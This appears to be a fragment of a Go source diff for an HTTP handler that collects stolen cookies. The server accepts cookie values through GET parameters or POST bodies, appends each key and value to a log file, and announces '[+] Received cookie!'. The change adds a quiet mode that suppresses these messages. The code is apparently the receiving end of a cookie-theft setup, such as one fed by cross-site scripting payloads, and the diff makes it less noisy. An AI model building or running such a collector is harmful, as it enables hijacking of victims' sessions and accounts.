@@ -5,27 +5,20 @@ import (
 	"net/http"
 	"log"
 	"fmt"
-	"flag"
 	"bufio"
 	"strings"
 )
 
-var (
-	cookielog string
-)
-
-func init() {
-
-	flag.StringVar(&cookielog, "cl", "cookielog.txt", "Output file for cookielog. -c needs to be provided")
-
-}
 
 func Cookies(w http.ResponseWriter, req *http.Request) {
 
 	// open logfile, create if not exist
 	logFile, err := os.OpenFile(cookielog, os.O_APPEND|os.O_RDWR|os.O_CREATE, 0644)
 	if err != nil {
-		log.Println("[-] Error creating cookielog file")
+		if !Quite {
+			log.Println("[-] Error creating cookielog file")
+		}
+		return
 	}
 	defer logFile.Close()
 
@@ -39,7 +32,9 @@ func Cookies(w http.ResponseWriter, req *http.Request) {
 		getParams := req.URL.Query()
 		for key, val := range getParams {
 			fmt.Fprintf(logFile, "[Key]: %s\n[Val]: %s\n\n", key, val)
-			log.Println("[+] Received cookie!")
+			if !Quite {
+				log.Println("[+] Received cookie!")
+			}
 		}
 
 	case "POST":
@@ -53,7 +48,9 @@ func Cookies(w http.ResponseWriter, req *http.Request) {
 				continue
 			}
 			fmt.Fprintf(logFile, "[Key]: %s\n[Val]: %s\n\n", cookieBuf[0], cookieBuf[1])
-			log.Println("[+] Received cookie!")
+			if !Quite {
+				log.Println("[+] Received cookie!")
+			}
 		}
 
 	}
